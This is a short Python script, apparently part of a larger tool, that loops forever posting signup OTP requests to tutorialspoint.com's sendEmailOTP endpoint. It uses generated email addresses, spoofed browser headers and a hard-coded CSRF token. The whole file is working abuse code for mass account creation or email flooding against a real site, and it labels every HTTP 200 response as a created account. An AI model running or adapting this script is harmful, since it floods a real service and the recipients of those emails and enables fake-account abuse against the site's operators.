import requests
from source.utils.emailformatter import getmail

def tutsploit():
    headers = {
        'authority': 'www.tutorialspoint.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.tutorialspoint.com',
        'referer': 'https://www.tutorialspoint.com/market/signup.jsp',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
        'x-csrf-token': '1Vip0yywDJtDexXs7xv0ZmjqBAEmM2wyssgs8RIb',
        'x-requested-with': 'XMLHttpRequest'
    }
    
    while True:
        useemail = getmail()
        data = {
            'email_id': useemail,
            'type': 'signup'
        }

        response = requests.post('https://www.tutorialspoint.com/market/sendEmailOTP.php', headers=headers, data=data)
        if response.status_code == 200:
            print("(TutorialSploit) Account created successfully - Email: {}".format(useemail))
        else:
            print("(TutorialSploit) Account creation failed - Status code: {}".format(response.status_code))
